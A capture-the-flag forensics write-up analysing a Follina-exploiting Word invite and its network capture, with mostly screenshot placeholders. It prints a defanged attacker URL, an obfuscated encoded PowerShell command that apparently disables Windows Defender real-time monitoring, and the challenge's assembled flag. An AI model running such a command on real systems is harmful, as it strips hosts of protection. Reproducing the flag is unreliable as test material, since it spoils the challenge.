# Lina's Invitation

## Prompt
A CEO of a startup company reported that he could no longer access his Password Vault. It seems the password has been changed, but he states not to have done so. He reports receiving a birthday invitation to a Paintball party the last week. A few days later, his Italian friend told him that her email had been hacked and never sent out those birthday invites. He fears his lost password might have something to do with that birthday invite. Their SOC team confirmed their assumptions by admitting that this document escaped their attention and did not trigger any alert. Now they want us, ENIGMA, to analyze the provided network capture they took on the day and the document sent via his friends' email.

## Files
- birthday_invite.docx
- capture.pcapng

## Tools Used
- https://github.com/decalage2/oletools

## birthday_invite.docx
![[Pasted image 20220718102452.png]]

### olevba on birthday_invite.docx
![[Pasted image 20220718102542.png]]

### unzipping the docx 
![[Pasted image 20220718102634.png]]

### using oletools on contents
![[Pasted image 20220718102808.png]]
`hxxp://windowsliveupdater.com?Pt2=RjBsbGluYV9oNHNf-->`

## pcap analysis

### suspicious site
![[Pasted image 20220718103018.png]]

### initial payload
![[Pasted image 20220718104058.png]]

### alex has been pwnd

![[Pasted image 20220718103125.png]]
```powershell
powershell.exe -enc LgAgACgAIAAkAGUAbgBWADoAYwBvAG0AUwBwAGUAYwBbADQALAAyADQALAAyADUAXQAtAEoATwBpAG4AJwAnACkAIAAoACAAKAAoACgAIgB7ADIAfQB7ADAAfQB7ADcAfQB7ADEAfQB7ADEAMQB9AHsANQB9AHsANgB9AHsAOQB9AHsAMQAwAH0AewA0AH0AewA4AH0AewAzAH0AIgAtAGYAIAAnAGUAZgAnACwAJwAgACcALAAnAFMAZQB0AC0ATQBwAFAAcgAnACwAJwB1AGUAJwAsACcAdAAnACwAJwBhAGwAdABpAG0AZQAnACwAJwBNAG8AbgBpACcALAAnAGUAcgBlAG4AYwBlACcALAAnAHIAJwAsACcAdABvAHIAJwAsACcAaQBuAGcAIABLADMANQAnACwAJwAtAEQAaQBzAGEAYgBsAGUAUgBlACcAKQApACAALQByAGUAcABMAGEAYwBFACAAIAAnAEsAMwA1ACcALABbAEMAaABBAFIAXQAzADYAKQApAA==
```

## Actual Forensics
### IOC 1
![[Pasted image 20220718104508.png]]
![[Pasted image 20220718104642.png]]
- flag pt 1 = `HTB{Zer0_DayZ_4Re_C0Ol_BuT_`

### IOC 2
![[Pasted image 20220718104805.png]]
![[Pasted image 20220718105013.png]]
- flag pt 3 = `b33n_pAtch3d!}`

### IOC 3 
![[Pasted image 20220718105142.png]]
- flag pt 2 = `F0llina_h4s_`

## Assembled flag
- `HTB{Zer0_DayZ_4Re_C0Ol_BuT_F0llina_h4s_B33N_PaTCH3D!}`